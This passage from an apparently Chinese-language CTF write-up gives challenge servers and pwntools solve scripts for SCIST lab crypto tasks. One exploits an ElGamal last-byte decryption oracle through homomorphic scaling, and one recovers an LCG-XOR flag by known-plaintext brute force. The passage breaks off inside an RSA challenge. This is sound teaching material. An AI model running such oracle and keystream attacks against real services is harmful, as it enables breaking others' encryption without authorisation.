class="variable language_">self</span>.nbyte = nbit // <span class="number">8</span></span><br><span class="line">        <span class="variable language_">self</span>.p = getPrime(nbit)</span><br><span class="line">        <span class="variable language_">self</span>.g = <span class="variable language_">self</span>.gen_generator()</span><br><span class="line">        <span class="variable language_">self</span>.x = randrange(<span class="number">2</span>, <span class="variable language_">self</span>.p - <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.y = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_generator</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="variable language_">self</span>.gen_prime():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(g, (<span class="variable language_">self</span>.p - <span class="number">1</span>) // <span class="number">2</span>, <span class="variable language_">self</span>.p) == <span class="variable language_">self</span>.p - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"It's impossible to get here."</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_prime</span>() -&gt; typing.Generator[<span class="built_in">int</span>, <span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> (<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> itertools.count(<span class="number">5</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime(k):</span><br><span class="line">                <span class="keyword">yield</span> k</span><br><span class="line">            <span class="keyword">if</span> isPrime(k + <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">yield</span> k + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">public_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"g"</span>: <span class="variable language_">self</span>.g, <span class="string">"y"</span>: <span class="variable language_">self</span>.y, <span class="string">"p"</span>: <span class="variable language_">self</span>.p})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        m = bytes_to_long(plaintext)</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt; m &lt; <span class="variable language_">self</span>.p</span><br><span class="line">        k = randrange(<span class="number">2</span>, <span class="variable language_">self</span>.p - <span class="number">2</span>)</span><br><span class="line">        c1 = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, k, <span class="variable language_">self</span>.p)</span><br><span class="line">        c2 = m * <span class="built_in">pow</span>(<span class="variable language_">self</span>.y, k, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b""</span>.join(</span><br><span class="line">            c.to_bytes(<span class="variable language_">self</span>.nbyte, byteorder=<span class="string">"big"</span>)</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> (c1, c2)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) == <span class="number">2</span> * <span class="variable language_">self</span>.nbyte</span><br><span class="line">        c1, c2 = <span class="built_in">tuple</span>(</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(ciphertext[idx:idx+<span class="variable language_">self</span>.nbyte], byteorder=<span class="string">"big"</span>)</span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="variable language_">self</span>.nbyte)</span><br><span class="line">        )</span><br><span class="line">        m = <span class="built_in">pow</span>(c1, -<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p) * c2 % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    cipher = ElGamal()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"public_key: <span class="subst">{cipher.public_key}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"flag: <span class="subst">{cipher.encrypt(FLAG.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cipher.nbyte):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; decrypt"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"decrypt"</span>:</span><br><span class="line">            ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">"&gt; Enter ciphertext: "</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"plaintext last byte: <span class="subst">{cipher.decrypt(ciphertext)[-<span class="number">1</span>]}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>每次只會給 ciphertext 解密後的最後一個 byte，試著運用 homomorphic來解這題</p><p><span class="math inline">\(c2 \cdot k \mod p = m \cdot k \modp\)</span></p><p>我們每次可以得到</p><p><span class="math inline">\(m \mod 256\)</span></p><p>希望可以迭代做到</p><p><span class="math inline">\(\lfloor \frac{m}{256}  \rfloor \mod 256 ,\lfloor \frac{m}{256 ^ 2}  \rfloor \mod 256, \lfloor \frac{m}{256 ^3}  \rfloor \mod 256, \cdots\)</span></p><p>想到可以用反模數來計算，令 <span class="math inline">\(s \equiv256^{-1} \mod p\)</span></p><p><span class="math display">\[\begin{align*}\lfloor \frac{m}{256}  \rfloor \mod 256 &amp;= (m - (m \mod 256)) \cdots \mod p \mod 256 \\&amp;= (256 + ((m \cdot s \mod p \mod 256) - ((m \mod 256) \cdot s \modp \mod 256))) \mod 256\end{align*}\]</span></p><p>就這樣不斷迭代就可以得到 flag ㄌ</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn = remote(<span class="string">'lab.scist.org'</span>, <span class="number">31415</span>)</span><br><span class="line">    <span class="comment"># conn = process(['python3', 'server.py'])</span></span><br><span class="line">    </span><br><span class="line">    line = conn.recvline().decode().strip()</span><br><span class="line">    public_key = json.loads(line.split(<span class="string">': '</span>, <span class="number">1</span>)[<span class="number">1</span>])</span><br><span class="line">    p = public_key[<span class="string">'p'</span>]</span><br><span class="line">    g = public_key[<span class="string">'g'</span>]</span><br><span class="line">    y = public_key[<span class="string">'y'</span>]</span><br><span class="line">    </span><br><span class="line">    line = conn.recvline().decode().strip()</span><br><span class="line">    flag_hex = line.split(<span class="string">': '</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>.fromhex(flag_hex)</span><br><span class="line">    nbyte = <span class="number">128</span> </span><br><span class="line">    c1_flag = <span class="built_in">int</span>.from_bytes(flag_bytes[:nbyte], <span class="string">'big'</span>)</span><br><span class="line">    c2_flag = <span class="built_in">int</span>.from_bytes(flag_bytes[nbyte:], <span class="string">'big'</span>)</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    s = <span class="built_in">pow</span>(<span class="number">256</span>, -<span class="number">1</span>, p)</span><br><span class="line">    </span><br><span class="line">    bytes_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line"></span><br><span class="line">        ciphertext = c1_flag.to_bytes(nbyte, <span class="string">'big'</span>) + (c2_flag % p).to_bytes(nbyte, <span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line">        conn.sendlineafter(<span class="string">"&gt; Command: "</span>, <span class="string">"decrypt"</span>)</span><br><span class="line">        conn.sendlineafter(<span class="string">"&gt; Enter ciphertext: "</span>, ciphertext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">        resp = conn.recvline().decode().strip()</span><br><span class="line">        last_byte = <span class="built_in">int</span>(resp.split(<span class="string">': '</span>)[<span class="number">1</span>])</span><br><span class="line">        last_byte = (<span class="number">256</span> + (last_byte) - (m * <span class="built_in">pow</span>(s, i) % p)) % <span class="number">256</span></span><br><span class="line">        m += last_byte * <span class="built_in">pow</span>(<span class="number">256</span>, i)</span><br><span class="line">        bytes_list.append(last_byte)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{i}</span>: <span class="subst">{<span class="built_in">chr</span>(last_byte)}</span>"</span>)</span><br><span class="line">        c2_flag = (c2_flag * s)</span><br><span class="line">    </span><br><span class="line">    bytes_list.reverse()</span><br><span class="line">    flag = <span class="built_in">bytes</span>(bytes_list).decode(errors=<span class="string">'replace'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Flag:"</span>, flag)</span><br><span class="line">    </span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>flag:<code>SCIST{I said elgamal can perform homomorphic encryption in class. :)}</code></p><h3 id="lcg-cipher---首殺">LCG cipher - 首殺 / <a href="#lcg-cipher---首殺" class="headerlink"></a></h3><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>(abc.ABC):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>(<span class="title class_ inherited__">PRNG</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbit: <span class="built_in">int</span> = <span class="number">128</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.nbyte = nbit // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.a = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.c = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.m = getPrime(nbit)</span><br><span class="line">        <span class="variable language_">self</span>.seed = getPrime(nbit // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>) -&gt; typing.Generator[<span class="built_in">int</span>, <span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="variable language_">self</span>.seed = (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.seed + <span class="variable language_">self</span>.c) % <span class="variable language_">self</span>.m</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> <span class="variable language_">self</span>.seed.to_bytes(<span class="variable language_">self</span>.nbyte, byteorder=<span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rpng: PRNG</span>):</span><br><span class="line">        <span class="variable language_">self</span>.rpng = copy.copy(rpng)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(pt ^ key <span class="keyword">for</span> pt, key <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, <span class="variable language_">self</span>.rpng.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = LCG()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"flag: <span class="subst">{Cipher(lcg).encrypt(FLAG.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; encrypt"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"encrypt"</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">"&gt; Enter plaintext: "</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"enc: <span class="subst">{Cipher(lcg).encrypt(plaintext.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>可以 byte by byte 的得到 flag，就一個個迭代就可以得到 flag ㄌ</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伺服器資訊</span></span><br><span class="line">HOST, PORT = <span class="string">"lab.scist.org"</span>, <span class="number">31416</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始 flag 猜測</span></span><br><span class="line">flag_guess = <span class="string">"SCIST{"</span></span><br><span class="line">charset = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&amp;*()-=+}{[]:;\"'&lt;&gt;,.?/|\\`~ "</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encrypted_flag</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="string">""" 取得加密的 flag """</span></span><br><span class="line">    conn.recvuntil(<span class="string">b"flag: "</span>)</span><br><span class="line">    encrypted_flag = <span class="built_in">bytes</span>.fromhex(conn.recvline().strip().decode())</span><br><span class="line">    <span class="keyword">return</span> encrypted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_known_plaintext</span>(<span class="params">conn, plaintext</span>):</span><br><span class="line">    <span class="string">""" 加密已知明文，獲取 PRNG 產生的密鑰 """</span></span><br><span class="line">    conn.sendlineafter(<span class="string">b"&gt; Command: "</span>, <span class="string">b"encrypt"</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b"&gt; Enter plaintext: "</span>, plaintext.encode())</span><br><span class="line">    conn.recvuntil(<span class="string">b"enc: "</span>)</span><br><span class="line">    encrypted = <span class="built_in">bytes</span>.fromhex(conn.recvline().strip().decode())</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_flag</span>():</span><br><span class="line">    <span class="keyword">global</span> flag_guess</span><br><span class="line"></span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line">    <span class="comment"># conn = process(['python3', 'server.py'])</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 取得密文 flag</span></span><br><span class="line">    encrypted_flag = get_encrypted_flag(conn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Encrypted Flag: <span class="subst">{encrypted_flag.<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 嘗試逐字解密</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            test_plaintext = flag_guess + char  <span class="comment"># 測試當前猜測</span></span><br><span class="line">            encrypted = encrypt_known_plaintext(conn, test_plaintext)  <span class="comment"># 取得對應加密結果</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># XOR flag_guess 的部分，看看是否與 flag 相同</span></span><br><span class="line">            <span class="keyword">if</span> encrypted[:<span class="built_in">len</span>(test_plaintext)] == encrypted_flag[:<span class="built_in">len</span>(test_plaintext)]:</span><br><span class="line">                flag_guess += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[+] Found: <span class="subst">{flag_guess}</span>"</span>)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found <span class="keyword">or</span> flag_guess.endswith(<span class="string">"}"</span>):  <span class="comment"># 結束條件</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Final Flag: <span class="subst">{flag_guess}</span>"</span>)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    brute_force_flag()</span><br></pre></td></tr></tbody></table></figure><p>flag:<code>SCIST{using linear congruential generator to implement a stream cipher}</code></p><h3 id="rs256---首殺">RS256 - 首殺 / <a href="#rs256---首殺" class="headerlink"></a></h3><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, inverse, isPrime, long_to_bytes, size</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RsaKey</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        p = <span class="variable language_">self</span>.get_forward_prime()</span><br><span class="line">        q = <span class="variable language_">self</span>.get_backward_prime()</span><br><span class="line">        <span class="variable language_">self</span>.n = p * q * (q + <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.e = <span class="number">0x10001</span></span><br><span class="line">        <span class="variable language_">self</span>.d = 